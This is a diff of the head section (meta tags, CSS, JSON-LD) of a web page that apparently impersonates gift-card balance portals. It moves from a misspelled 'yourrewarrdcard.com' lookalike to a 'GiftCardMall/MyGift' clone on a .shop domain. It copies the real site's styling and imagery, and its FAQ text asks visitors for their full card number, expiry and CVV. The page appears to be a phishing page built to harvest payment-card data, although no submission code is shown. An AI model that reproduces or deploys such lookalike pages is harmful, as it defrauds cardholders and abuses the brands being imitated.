@@ -1,599 +1,775 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <base href="/">
-  <title>Gift Card Balance Check – Check Gift Card Balance Online | Your Reward Card</title>
-  <link rel="icon" type="image/x-icon" href="favicon.ico">
-  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
-  <link rel="canonical" href="https://www.yourrewarrdcard.com/">
-  <meta name="description" content="Check gift card balance online instantly. Free gift card check for Visa and Mastercard reward cards. Sign in to check your gift card balance, activate your card, and manage your reward card.">
-  <meta name="keywords" content="gift card balance, check gift card, gift card check, gift check, your reward card, check gift card balance, gift card balance check, Visa gift card balance, Mastercard gift card balance, reward card balance, prepaid card balance, check my card balance">
-  <meta name="robots" content="index, follow">
-  <meta property="og:title" content="Gift Card Balance Check – Check Gift Card Online | Your Reward Card">
-  <meta property="og:site_name" content="Your Reward Card">
-  <meta property="og:description" content="Check gift card balance online instantly. Free Visa and Mastercard gift card balance checker. Sign in, activate, and manage your reward card.">
-  <meta property="og:type" content="website">
-  <meta property="og:url" content="https://www.yourrewarrdcard.com/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Gift Card Balance Check – Your Reward Card">
-  <meta name="twitter:description" content="Check gift card balance online. Free gift card checker for Visa and Mastercard reward cards.">
-  <meta name="msvalidate.01" content="A40BEB909B088BC18CAE5F9038842313">
-  <meta name="google-site-verification" content="k6Cjgd-mnwDE7akhFQ4CI2ShauDBKFi3qBX4zjfIDVw">
-  <meta name="yandex-verification" content="3efd0ff0444eea5e">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
-  <script>
-    (function() {
-      var loc = window.location;
-      var p = (loc.pathname || '/').replace(/\/$/, '') || '/';
-      if (loc.href.indexOf('#') === -1 && p !== '/' && p !== '/index.html') {
-        window.location.hash = '#' + loc.pathname + loc.search;
-      }
-    })();
-  </script>
-  <style>
-    html {
-      font-family: sans-serif;
-      -ms-text-size-adjust: 100%;
-      -webkit-text-size-adjust: 100%;
-      font-size: 10px;
-      -webkit-tap-highlight-color: rgba(0,0,0,0);
-    }
-    body {
-      margin: 0;
-      font-family: 'Open Sans', Helvetica Neue, Helvetica, Arial, sans-serif;
-      font-size: 14px;
-      line-height: 1.42857143;
-      background-color: #f1f1f1 !important;
-      color: #414a52;
-      min-height: 100vh;
-      box-sizing: border-box;
-    }
-    *, *:after, *:before { box-sizing: border-box; }
-    /* Main page – yourrewardcard.com style (yourewardcard) */
-    :root{
-      --dark-bar:#353a40;
-      --nav-bg:#f2f2f2;
-      --content-bg:#f1f1f1;
-      --white:#fff;
-      --text:#414a52;
-      --text-muted:#555;
-      --border:#ccc;
-      --success:#0d7d4a;
-      --error:#c53030;
-      --link-blue:#0066cc;
-      --font:'Open Sans',Helvetica Neue,Helvetica,Arial,sans-serif;
-      --radius:4px;
-    }
-    *{margin:0;padding:0;box-sizing:border-box}
-    .app{min-height:100vh;display:flex;flex-direction:column}
-    body.main-page-scroll{background:#f1f1f1}
-    /* To use same background image as reference: add background-image: url('your-image.jpg'); background-size: cover; to body.main-page-scroll */
-    body.main-page-scroll .main-scroll-wrap{flex:1}
-    .header-sticky{position:sticky;top:0;z-index:100}
-    /* Top bar – dark grey */
-    .top-bar{background:var(--dark-bar);color:var(--white);padding:.5rem 1rem;font-size:.8125rem}
-    .top-bar-inner{max-width:970px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.5rem}
-    .top-bar-left{display:flex;flex-direction:column;line-height:1.3}
-    .top-bar-right{display:flex;align-items:center;gap:.75rem}
-    .top-bar-right a{color:var(--white);text-decoration:none}
-    .top-bar-right a:hover{text-decoration:underline}
-    .top-bar-sep{color:rgba(255,255,255,.5);user-select:none}
-    .top-bar-lang{display:inline-flex;align-items:center;gap:4px}
-    /* Main nav – light grey */
-    .main-nav{background:var(--nav-bg);padding:1rem 1.5rem;border-bottom:1px solid var(--border)}
-    .main-nav-inner{max-width:970px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
-    .site-logo{font-size:1.75rem;font-weight:700;color:var(--text);text-decoration:none;letter-spacing:-0.02em}
-    .site-logo:hover{color:var(--text)}
-    .main-nav-links{display:flex;gap:1.5rem}
-    .main-nav-links a{color:var(--text);text-decoration:none;font-size:.9375rem}
-    .main-nav-links a:hover{text-decoration:underline}
-    /* Main content – scroll sections (reference: hero background), no blur */
-    .main{flex:1;padding:0;width:100%;background-image:url('https://images.ctfassets.net/clvazscvae0g/1TLlw2zuZSWKCoiqia84wC/fb8da87d884ae0dfa898737682f4034e/RC_HERO_EN_011217.jpg');background-size:cover;background-position:center;background-repeat:no-repeat;filter:none}
-    .main-inner{max-width:970px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:0;align-items:stretch;min-height:420px}
-    @media(max-width:900px){.main-inner{grid-template-columns:1fr}}
-    /* Section 2 – How to activate bar */
-    .activate-bar{background:#2d3136;color:#fff;padding:.75rem 1.5rem}
-    .activate-bar-inner{max-width:970px;margin:0 auto;font-size:.9375rem}
-    /* Section 2 – Getting Started */
-    .section-getting-started{background:var(--content-bg);padding:3rem 1.5rem}
-    .section-getting-started .section-inner{max-width:970px;margin:0 auto}
-    .section-getting-started h1{font-size:1.875rem;font-weight:700;color:var(--text);margin-bottom:2rem}
-    .getting-started-grid{display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:start}
-    @media(max-width:900px){.getting-started-grid{grid-template-columns:1fr}}
-    .getting-started-cards-col{background:var(--content-bg);padding:2rem 0;min-height:260px}
-    .card-images-wrap{position:relative;min-height:240px;max-width:320px}
-    .card-image{background:linear-gradient(145deg,#b8b8b8 0%,#d8d8d8 30%,#e8e8e8 70%,#d0d0d0 100%);border-radius:12px;padding:1.25rem 1.5rem;position:absolute;width:88%;max-width:300px;box-shadow:0 6px 20px rgba(0,0,0,.2),0 2px 6px rgba(0,0,0,.12);font-family:var(--font);color:#414a52;border:1px solid rgba(255,255,255,.5);display:flex;flex-direction:column;gap:.2rem}
-    .card-image.top{top:0;left:0;transform:rotate(-5deg);z-index:2}
-    .card-image.bottom{bottom:0;right:0;transform:rotate(5deg);z-index:1}
-    .card-image .card-label{font-weight:700;font-size:.9rem;margin-bottom:.35rem;letter-spacing:-0.02em}
-    .card-image .card-number{font-size:1rem;letter-spacing:.12em;font-weight:500;margin:.25rem 0}
-    .card-image .card-expires{font-size:.7rem;text-transform:uppercase;letter-spacing:.04em;color:#555}
-    .card-image .card-recipient{font-size:.65rem;text-transform:uppercase;letter-spacing:.08em;color:#555;margin-top:.5rem}
-    .card-image .card-debit{font-size:.75rem;text-transform:uppercase;font-weight:600;color:#555}
-    .card-image .card-network{font-size:.85rem;font-weight:700;margin-top:auto;padding-top:.5rem;text-align:right}
-    .card-image .card-icon{position:absolute;top:1rem;right:1.25rem;width:28px;height:28px;opacity:.8}
-    .getting-started-text{background:var(--white);padding:2rem;border-radius:8px;border:1px solid var(--border);box-shadow:0 2px 8px rgba(0,0,0,.05)}
-    .getting-started-text h2{font-size:1.125rem;font-weight:700;color:var(--text);margin-bottom:.5rem}
-    .getting-started-text p{font-size:.875rem;color:var(--text-muted);line-height:1.6;margin-bottom:1.25rem}
-    /* Section 3 – Three feature cards */
-    .section-feature-cards{background:var(--content-bg);padding:3rem 1.5rem}
-    .section-feature-cards .section-inner{max-width:970px;margin:0 auto}
-    .feature-cards-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2rem;margin-bottom:2rem}
-    @media(max-width:900px){.feature-cards-grid{grid-template-columns:1fr}}
-    .feature-card{background:var(--white);border:1px solid var(--border);border-radius:4px;padding:2rem;box-shadow:0 2px 8px rgba(0,0,0,.06)}
-    .feature-card .feature-icon{width:64px;height:64px;background:#e8e8e8;border-radius:8px;margin-bottom:1.25rem;display:flex;align-items:center;justify-content:center;font-size:1.5rem;color:#666}
-    .feature-card .feature-icon svg{width:40px;height:40px;fill:#555}
-    .flag-us{display:inline-block;width:22px;height:14px;vertical-align:middle;margin-right:6px;border:1px solid rgba(0,0,0,.25);border-radius:1px;object-fit:cover}
-    .feature-card h3{font-size:1.25rem;font-weight:600;color:var(--text);margin-bottom:.75rem}
-    .feature-card p{font-size:.875rem;color:var(--text-muted);line-height:1.6;margin-bottom:1rem}
-    .feature-card a{font-size:.875rem;color:var(--text);text-decoration:underline}
-    .feature-card a:hover{color:var(--link-blue)}
-    .back-to-top-wrap{text-align:center;margin-top:1.5rem}
-    .back-to-top-wrap a{color:var(--text);font-size:.875rem;text-decoration:underline}
-    /* Section 4 – Full footer */
-    .footer-full{background:var(--dark-bar);color:rgba(255,255,255,.9);padding:2rem 1.5rem 3rem}
-    .footer-full .footer-top{max-width:970px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:1rem;margin-bottom:2rem}
-    .footer-full .footer-logo{font-size:1.25rem;font-weight:700;color:#fff}
-    .footer-full .footer-links a{color:rgba(255,255,255,.9);text-decoration:none;font-size:.875rem;margin-left:1.5rem}
-    .footer-full .footer-links a:hover{color:#fff;text-decoration:underline}
-    .footer-full .back-to-top{margin-top:.5rem;display:inline-block;color:rgba(255,255,255,.8);font-size:.8125rem;text-decoration:none}
-    .footer-full .footer-bottom{max-width:970px;margin:0 auto;font-size:.8125rem;line-height:1.7}
-    .footer-full .footer-bottom a{color:#6b9bd1;text-decoration:none}
-    .footer-full .footer-bottom a:hover{text-decoration:underline}
-    .footer-full .copyright{margin-bottom:1rem}
-    .footer-full .legal{margin-bottom:1rem}
-    .footer-full .policy-links{margin-top:1rem}
-    /* Left – form card (white, rounded top-right) */
-    .form-panel{background:var(--white);border:1px solid var(--border);border-top:none;border-radius:0 8px 0 0;padding:2rem;box-shadow:0 2px 8px rgba(0,0,0,.06);max-width:420px}
-    .form-tabs{display:flex;margin-bottom:1.5rem}
-    .form-tab{flex:1;padding:.75rem 1rem;text-align:center;font-size:.9375rem;font-weight:600;cursor:pointer;border:none;background:var(--nav-bg);color:var(--text);border-radius:var(--radius) var(--radius) 0 0}
-    .form-tab.active{background:var(--dark-bar);color:var(--white)}
-    .form-tab:not(.active):hover{background:#e8e8e8}
-    .form-tab-activate{background:var(--white);color:var(--text);border:1px solid var(--border);border-bottom:none}
-    .form-card-title{font-size:1rem;font-weight:600;color:var(--text);margin-bottom:1.25rem}
-    .form-group{margin-bottom:1rem}
-    .form-group label{display:block;font-size:.6875rem;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:.35rem}
-    .form-group input{width:100%;padding:.65rem .75rem;font-size:1rem;border:1px solid var(--border);border-radius:var(--radius);background:var(--white)}
-    .form-group input:focus{outline:0;border-color:#666}
-    .form-group input.error{border-color:var(--error)}
-    .form-row{display:grid;grid-template-columns:1fr 1fr;gap:.75rem}
-    .expiry-inputs{display:flex;align-items:center;gap:.35rem}
-    .expiry-inputs input{flex:1;text-align:center}
-    .expiry-sep{color:var(--text-muted);font-size:.875rem}
-    .field-error{font-size:.75rem;color:var(--error);margin-top:.25rem}
-    .form-checkbox{display:flex;align-items:center;gap:.5rem;margin:1rem 0;font-size:.875rem;color:var(--text)}
-    .form-checkbox input{width:auto}
-    .btn-signin{width:100%;padding:.85rem 1.5rem;font-size:1rem;font-weight:600;border:none;border-radius:var(--radius);cursor:pointer;background:var(--dark-bar);color:var(--white);margin-top:.5rem}
-    .btn-signin:hover:not(:disabled){background:#2a2e33}
-    .btn-signin:disabled{opacity:.7;cursor:not-allowed}
-    .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:currentColor;border-radius:50%;animation:spin .8s linear infinite;display:inline-block;vertical-align:middle}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    /* Result & Check Another */
-    .balance-result{margin-top:1.25rem;padding:1.25rem;border-radius:var(--radius);text-align:center;display:none}
-    .balance-result.show{display:block}
-    .balance-result.success{background:#e8f5ee;border:1px solid #a5d6a7}
-    .balance-result.error{background:#ffebee;border:1px solid #ef9a9a}
-    .result-icon{width:40px;height:40px;margin:0 auto .75rem;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.25rem;font-weight:700}
-    .balance-result.success .result-icon{background:var(--success);color:white}
-    .balance-result.error .result-icon{background:var(--error);color:white}
-    .balance-amount{display:flex;align-items:baseline;justify-content:center;gap:.5rem;margin-bottom:.35rem}
-    .balance-amount .amount{font-size:1.5rem;font-weight:700;color:var(--success)}
-    #checkAnother{display:none;width:100%;padding:.65rem;font-size:.875rem;background:var(--white);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);cursor:pointer;margin-top:.75rem}
-    #checkAnother.show{display:block}
-    #formFields.hide{display:none}
-    /* Right – promo panel */
-    .promo-panel{background:transparent;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem;position:relative;filter:none}
-    .promo-text{font-size:3.5rem;font-weight:300;color:rgba(255,255,255,.95);text-shadow:0 1px 3px rgba(0,0,0,.4);letter-spacing:-0.02em;line-height:1;margin-bottom:1.5rem}
-    .promo-image{width:100%;max-width:380px;height:280px;background:rgba(255,255,255,.1);border-radius:8px;filter:none}
-    .promo-image img{width:100%;height:100%;object-fit:cover;border-radius:8px}
-    /* Other pages */
-    .content-wrap{max-width:1140px;margin:0 auto;padding:2rem 1.5rem}
-    .hero{text-align:center;margin-bottom:2rem}
-    .hero h1{font-size:1.75rem;font-weight:700;color:var(--text);margin-bottom:.5rem}
-    .content-section{background:var(--white);border-radius:8px;padding:2rem;margin-bottom:1.5rem;border:1px solid var(--border)}
-    .content-section h2{font-size:1.25rem;margin-bottom:1rem;color:var(--text)}
-    .content-section p,.faq-item p{color:var(--text-muted);line-height:1.7;margin-bottom:1rem}
-    .faq-item{margin-bottom:1.5rem}
-    .faq-item h4{font-size:1rem;margin-bottom:.5rem;color:var(--text)}
-    .contact-info a{color:var(--link-blue);text-decoration:none}
-    .contact-info a:hover{text-decoration:underline}
-    /* Footer – dark grey */
-    .footer{background:var(--dark-bar);color:var(--white);padding:1.5rem 1.5rem;margin-top:auto}
-    .footer-inner{max-width:1140px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
-    .footer-logo{font-size:1.25rem;font-weight:700;color:var(--white)}
-    .footer-links{display:flex;gap:1.5rem}
-    .footer-links a{color:rgba(255,255,255,.9);text-decoration:none;font-size:.875rem}
-    .footer-links a:hover{color:var(--white);text-decoration:underline}
-    .back-to-top{display:block;text-align:center;margin-top:1rem;color:rgba(255,255,255,.8);font-size:.8125rem;text-decoration:none}
-    .back-to-top:hover{color:var(--white)}
-    /* Cookie bar */
-    .cookie-bar{position:fixed;bottom:0;left:0;right:0;background:var(--dark-bar);color:var(--white);padding:1rem 1.5rem;display:flex;align-items:center;justify-content:center;gap:1rem;flex-wrap:wrap;z-index:10000;font-size:.875rem}
-    .cookie-bar.hide{display:none}
-    .cookie-bar p{margin:0;flex:1;min-width:200px}
-    .cookie-bar .btn-accept{padding:.5rem 1.25rem;font-size:.875rem;font-weight:600;background:var(--white);color:var(--dark-bar);border:none;border-radius:var(--radius);cursor:pointer}
-    .loading-overlay{position:fixed;inset:0;background:rgba(242,242,242,.95);display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;gap:1rem}
-    .loading-overlay.show{display:flex}
-    .loading-overlay .spinner-lg{width:40px;height:40px;border:3px solid var(--border);border-top-color:var(--dark-bar);border-radius:50%;animation:spin .8s linear infinite}
-  </style>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "WebSite",
-    "name": "Your Reward Card",
-    "alternateName": ["Gift Card Balance Check", "Gift Card Checker"],
-    "url": "https://www.yourrewarrdcard.com/",
-    "description": "Check gift card balance online. Free Visa and Mastercard reward card balance checker.",
-    "potentialAction": {
-      "@type": "SearchAction",
-      "target": "https://www.yourrewarrdcard.com/?q={search_term_string}",
-      "query-input": "required name=search_term_string"
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>GiftCardMall/MyGift - Check Gift Card Balance Online | Gift Card Mall</title>
+<meta name="description" content="Check your gift card balance at GiftCardMall/MyGift. Use Gift Card Mall to check my gift card balance, register, and activate Visa gift cards online securely.">
+<meta name="keywords" content="GiftCardMall, MyGift, gift card mall, gift card balance, check my gift card, check gift card balance, mygift gift card, giftcardmall mygift, visa gift card balance, check gift card, gift card balance check, prepaid gift card balance, activate gift card, register gift card, mygift balance, gift card mall balance check, mygiftgiftcardmall, check my gift card balance, gift card activation, visa gift card, prepaid card balance">
+<meta name="geo.region" content="US">
+<meta name="geo.placename" content="United States">
+<meta name="language" content="English">
+<meta http-equiv="content-language" content="en-US">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="GiftCardMall/MyGift">
+<meta name="application-name" content="GiftCardMall/MyGift">
+<meta name="msapplication-TileColor" content="#0066cc">
+<meta name="theme-color" content="#0066cc">
+<meta name="author" content="GiftCardMall/MyGift">
+<meta name="revisit-after" content="1 days">
+<meta name="distribution" content="global">
+<meta name="rating" content="general">
+<link rel="canonical" href="https://www.mygiftgiftcardmall.shop/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="GiftCardMall/MyGift - Gift Card Mall">
+<meta property="og:title" content="GiftCardMall/MyGift - Check Gift Card Balance Online | Gift Card Mall">
+<meta property="og:description" content="Check your gift card balance at GiftCardMall/MyGift. Gift Card Mall portal to register, activate, and check my gift card balance online instantly.">
+<meta property="og:url" content="https://www.mygiftgiftcardmall.shop/">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.mygiftgiftcardmall.shop/BurgerLogo.png">
+<meta property="og:image:alt" content="GiftCardMall MyGift - Gift Card Mall Balance Check">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GiftCardMall/MyGift - Check Gift Card Balance | Gift Card Mall">
+<meta name="twitter:description" content="Check my gift card balance online at Gift Card Mall. Activate, register, and manage your MyGift Visa gift card securely 24/7.">
+<meta name="twitter:image" content="https://www.mygiftgiftcardmall.shop/BurgerLogo.png">
+<meta name="msvalidate.01" content="A40BEB909B088BC18CAE5F9038842313">
+<meta name="google-site-verification" content="k6Cjgd-mnwDE7akhFQ4CI2ShauDBKFi3qBX4zjfIDVw">
+<meta name="yandex-verification" content="3efd0ff0444eea5e">
+<link rel="icon" type="image/x-icon" href="/favicon.ico">
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<link rel="dns-prefetch" href="//fonts.googleapis.com">
+<link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+<link rel="preload" href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" as="style">
+<link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" as="style">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "GiftCardMall/MyGift",
+  "alternateName": ["MyGift", "GiftCardMall", "Gift Card Mall", "MyGiftGiftCardMall", "GiftCardMall MyGift", "mygift giftcardmall"],
+  "url": "https://www.mygiftgiftcardmall.shop/",
+  "description": "Check gift card balance, register, and activate your Visa gift card at GiftCardMall/MyGift — the trusted Gift Card Mall portal.",
+  "inLanguage": "en-US",
+  "potentialAction": [{
+    "@type": "SearchAction",
+    "target": { "@type": "EntryPoint", "urlTemplate": "https://www.mygiftgiftcardmall.shop/?q={search_term_string}" },
+    "query-input": "required name=search_term_string"
+  }]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "GiftCardMall/MyGift",
+  "alternateName": ["Gift Card Mall", "MyGift", "GiftCardMall"],
+  "url": "https://www.mygiftgiftcardmall.shop/",
+  "logo": "https://www.mygiftgiftcardmall.shop/BurgerLogo.png",
+  "description": "GiftCardMall/MyGift is a Gift Card Mall portal where you can check gift card balance, register, and activate Visa prepaid gift cards online.",
+  "contactPoint": {
+    "@type": "ContactPoint",
+    "telephone": "+1-888-524-1183",
+    "contactType": "customer service",
+    "areaServed": "US",
+    "availableLanguage": "English"
+  },
+  "sameAs": []
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+    "@type": "ListItem",
+    "position": 1,
+    "name": "Gift Card Mall Home",
+    "item": "https://www.mygiftgiftcardmall.shop/"
+  }]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebPage",
+  "name": "GiftCardMall/MyGift - Check Gift Card Balance Online",
+  "description": "Check your gift card balance at GiftCardMall/MyGift Gift Card Mall. Register, activate, and check my gift card balance online.",
+  "url": "https://www.mygiftgiftcardmall.shop/",
+  "isPartOf": { "@type": "WebSite", "name": "GiftCardMall/MyGift", "url": "https://www.mygiftgiftcardmall.shop/" },
+  "about": {
+    "@type": "Service",
+    "name": "Gift Card Balance Check",
+    "description": "Check gift card balance online for GiftCardMall/MyGift Visa prepaid gift cards. View remaining funds, register your card, and activate new cards at Gift Card Mall.",
+    "provider": { "@type": "Organization", "name": "GiftCardMall/MyGift" },
+    "serviceType": "Gift Card Management"
   }
-  </script>
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "FAQPage",
-    "mainEntity": [
-      {
-        "@type": "Question",
-        "name": "How do I check my gift card balance?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Sign in on the home page with your card number, expiration date (MM/YY), and CVV (3-digit security code). Your available gift card balance will be displayed after verification."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Where can I use my reward card?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Your reward card can be used anywhere Debit Mastercard or Visa debit cards are accepted in the United States and District of Columbia — online, in stores, for bill payments, and at ATMs."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "How do I activate my gift card?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Visit the home page and use the Activate Card option. Enter your card number, expiration date, and security code (CVV) when prompted."
-        }
-      }
-    ]
-  }
-  </script>
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [{
+    "@type": "Question",
+    "name": "How do I check my gift card balance at GiftCardMall/MyGift?",
+    "acceptedAnswer": { "@type": "Answer", "text": "To check your gift card balance, visit the GiftCardMall/MyGift homepage, click the Check Balance tab, enter your 16-digit card number, expiration date, and CVV, then click Submit to see your available balance and recent transactions instantly." }
+  },{
+    "@type": "Question",
+    "name": "What is GiftCardMall/MyGift Gift Card Mall?",
+    "acceptedAnswer": { "@type": "Answer", "text": "GiftCardMall/MyGift is a Gift Card Mall portal that allows you to register, activate, check gift card balance, and manage Visa and Mastercard prepaid gift cards online with bank-level security." }
+  },{
+    "@type": "Question",
+    "name": "How do I register my card at Gift Card Mall?",
+    "acceptedAnswer": { "@type": "Answer", "text": "To register your card at Gift Card Mall, open the Register Card tab on the homepage, enter your 16-digit card number, expiry date (MM/YY), and 3-digit CVV, then click Register Card to complete the setup for online and phone purchases." }
+  },{
+    "@type": "Question",
+    "name": "Where can I use my GiftCardMall/MyGift Visa gift card?",
+    "acceptedAnswer": { "@type": "Answer", "text": "Your GiftCardMall/MyGift Visa gift card works at any merchant that accepts Visa debit cards throughout the United States and the District of Columbia, including retail stores, restaurants, and online shops." }
+  },{
+    "@type": "Question",
+    "name": "How do I activate my gift card from Gift Card Mall?",
+    "acceptedAnswer": { "@type": "Answer", "text": "Some Gift Card Mall cards are activated at purchase. Others require online activation — check the sticker on your card for instructions. You may need to call a toll-free number or visit the activation page to enter your card number and CVV." }
+  },{
+    "@type": "Question",
+    "name": "Can I check my gift card balance without registering?",
+    "acceptedAnswer": { "@type": "Answer", "text": "Yes, you can check your gift card balance at GiftCardMall/MyGift without registering first. Simply use the Check Balance tab, enter your card number, expiration date, and CVV to view your available funds." }
+  },{
+    "@type": "Question",
+    "name": "How do I personalize my PIN at GiftCardMall/MyGift?",
+    "acceptedAnswer": { "@type": "Answer", "text": "Navigate to the Personalize PIN tab on the GiftCardMall/MyGift homepage, enter your card details, and follow the on-screen prompts to create your own 4-digit PIN for in-store and ATM transactions." }
+  },{
+    "@type": "Question",
+    "name": "What should I do if my gift card balance seems wrong?",
+    "acceptedAnswer": { "@type": "Answer", "text": "First, check your gift card balance and review recent transactions on the GiftCardMall/MyGift portal. Some merchants place temporary holds that may show as pending. If you see unauthorized charges, use the Track Disputes tab or contact customer service immediately." }
+  }]
+}
+</script>
+
+<link rel="preload" href="/image1.jpg" as="image">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Roboto Condensed', sans-serif; background: #f9f9f9; color: #000; line-height: 1.6; }
+html, body { max-width: 100%; overflow-x: hidden; }
+.issuing-bar h2 { text-align: left; padding-left: 280px; font-weight: normal !important; }
+.contact-text { font-size: 20px !important; line-height: 1.3 !important; }
+.contact-row .label { font-size: 20px !important; }
+.footer-column h4 { font-weight: normal !important; }
+
+.site-header { height: auto; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
+.header-inner { max-width: 1100px; margin: 0 auto; padding: 10px 16px; display: grid; grid-template-columns: auto 40px auto; align-items: center; gap: 12px; }
+.logo-link { display: inline-flex; align-items: center; }
+.logo-img { max-height: 64px; width: auto; display: block; }
+.buy-btn { justify-self: end; background: #cc5a02; color: #fff; padding: 10px 16px; border-radius: 5px; text-decoration: none; font-weight: bold; white-space: nowrap; }
+
+.nav-toggle { width: 40px; height: 40px; border: 1px solid #e5e7eb; background: #fff; border-radius: 6px; display: inline-flex; align-items: center; justify-content: center; cursor: pointer; }
+.nav-toggle-box { width: 20px; display: grid; gap: 4px; }
+.nav-toggle-line { height: 2px; background: #111827; display: block; border-radius: 2px; }
+
+.nav-panel { grid-column: 1 / -1; background: #fff; border-top: 1px solid #eef2f7; display: none; }
+.nav-panel.is-open { display: block; }
+.nav-list { list-style: none; margin: 8px 0; padding: 8px 0; display: grid; gap: 2px; }
+.nav-list a { display: block; padding: 10px 6px; color: #1f2937; text-decoration: none; font-weight: 600; border-radius: 6px; }
+.nav-list a:hover { background: #f3f4f6; }
+
+@media (min-width: 900px) {
+  .header-inner { grid-template-columns: auto 1fr auto; }
+  .nav-toggle { display: none; }
+  .nav-panel { display: block; border-top: none; grid-column: auto; }
+  .nav-list { display: inline-flex; gap: 18px; margin: 0 12px; padding: 0; }
+  .nav-list a { padding: 10px 8px; }
+}
+@media (max-width: 899px) {
+  .logo-img { max-height: 48px; }
+}
+
+.hero { background: url('image1.jpg') center/cover no-repeat; height: 500px; position: relative; color: white; display: flex; align-items: center; justify-content: center; text-align: center; }
+.hero::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(to bottom, rgba(0,0,0,0.7), rgba(0,0,0,0.4)); }
+.hero-content { position: relative; z-index: 2; max-width: 900px; padding: 20px; }
+.hero h1 { font-size: 48px; margin-bottom: 20px; }
+.hero p { font-size: 20px; }
+
+.container { max-width: 1000px; margin: 40px auto; background: #fff; border-radius: 10px; overflow: hidden; border: 1px solid #ccc; box-shadow: none; }
+.tabs-official { display: flex; background: #a3c7e4; }
+.tab-official { padding: 16px 24px; font-size: 15px; font-weight: 600; color: #fff; cursor: pointer; }
+.tab-official.active { background: #fff; color: #003087; border-left: 1px solid #ddd; border-right: 1px solid #ddd; border-top: 4px solid #fff; border-radius: 11px 11px 0 0; margin-top: -4px; padding-top: 20px; }
+.form-section-official { padding: 40px 60px; background: #fff; }
+.instruction-text { text-align: center; margin-bottom: 30px; color: #000; font-size: 16px; }
+
+.form-grid-official { display: flex; justify-content: center; gap: 30px; margin-bottom: 40px; flex-wrap: wrap; }
+.field-group { display: flex; flex-direction: column; }
+.field-label { font-size: 13px; color: #000; margin-bottom: 6px; }
+.required { color: #c00; }
+.input-field { padding: 12px 14px; border: 1px solid #aaa; border-radius: 6px; font-size: 16px; background: #fff; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); color: #555; font-weight: 400; }
+.input-field::placeholder { color: #555; opacity: 1; font-weight: 400; }
+.input-field:focus { outline: none; border-color: #aaa; box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); }
+.input-field.error { border-color: #c00; }
+.large { width: 280px; } .medium { width: 160px; } .small { width: 70px; }
+.exp-wrapper { display: flex; align-items: center; gap: 8px; }
+.slash { font-size: 20px; color: #666; margin-top: -4px; }
+.cvv-wrapper { position: relative; display: inline-block; }
